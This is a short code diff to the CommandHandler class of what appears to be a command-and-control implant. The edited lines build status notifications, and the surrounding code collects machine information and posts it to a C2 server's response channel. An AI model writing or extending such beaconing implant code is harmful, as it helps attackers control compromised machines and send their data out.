@@ -25,7 +25,7 @@ class CommandHandler:
 
         self.machineInfo = MachineInfo()
         self.exeHandler = ExecutingProgramHandler()
-        self.notificationBuilder = NotificationBuilder()
+        self.notificationBuilder = NotificationBuilder(self.crypt)
         self.cmdConverter = CommandConverter()
 
 
@@ -65,7 +65,7 @@ class CommandHandler:
         print("Announcing status to C2 server...")
 
         mInfo = self.machineInfo.get_machine_info()
-        ntfy = self.notificationBuilder.build_notification(mInfo, Events["START"])
+        ntfy = self.notificationBuilder.build_notification(mInfo, Command.STATUS)
 
         r = requests.post(CommChannels["RESPONSE_CHANNEL"], data=ntfy.encode(encoding='utf-8'))
         if r.status_code == 200:
